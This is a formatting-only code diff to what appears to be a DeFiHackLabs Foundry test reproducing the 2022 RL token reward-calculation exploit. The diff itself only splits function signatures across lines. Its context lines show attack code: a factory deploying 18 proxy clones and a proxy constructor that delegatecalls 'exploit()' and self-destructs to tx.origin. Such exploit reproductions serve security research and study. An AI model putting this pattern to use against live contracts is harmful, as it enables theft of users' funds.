@@ -17,9 +17,13 @@ import "./../interface.sol";
 // https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main#20221001-rl-token---incorrect-reward-calculation
 
 interface IDBW is IERC20 {
-    function pledge_lp(uint256 count) external;
+    function pledge_lp(
+        uint256 count
+    ) external;
     function getStaticIncome() external;
-    function redemption_lp(uint256 count) external;
+    function redemption_lp(
+        uint256 count
+    ) external;
 }
 
 contract ContractTest is Test {
@@ -113,7 +117,9 @@ contract ContractTest is Test {
         );
     }
 
-    function miniProxyCloneFactory(address impl) internal {
+    function miniProxyCloneFactory(
+        address impl
+    ) internal {
         for (uint256 i; i < 18; ++i) {
             uint256 _salt = uint256(keccak256(abi.encodePacked(i)));
             bytes memory creationBytecode = getCreationBytecode(address(impl));
@@ -141,7 +147,9 @@ contract ContractTest is Test {
         );
     }
 
-    function getCreationBytecode(address claimImpl) public pure returns (bytes memory) {
+    function getCreationBytecode(
+        address claimImpl
+    ) public pure returns (bytes memory) {
         bytes memory bytecode = type(miniProxy).creationCode;
         return abi.encodePacked(bytecode, abi.encode(claimImpl));
     }
@@ -176,7 +184,9 @@ contract claimRewardImpl is Test {
 }
 
 contract miniProxy {
-    constructor(address claimRewardImpl) {
+    constructor(
+        address claimRewardImpl
+    ) {
         (bool success,) = claimRewardImpl.delegatecall(abi.encodeWithSignature("exploit()"));
         require(success);
         selfdestruct(payable(tx.origin));
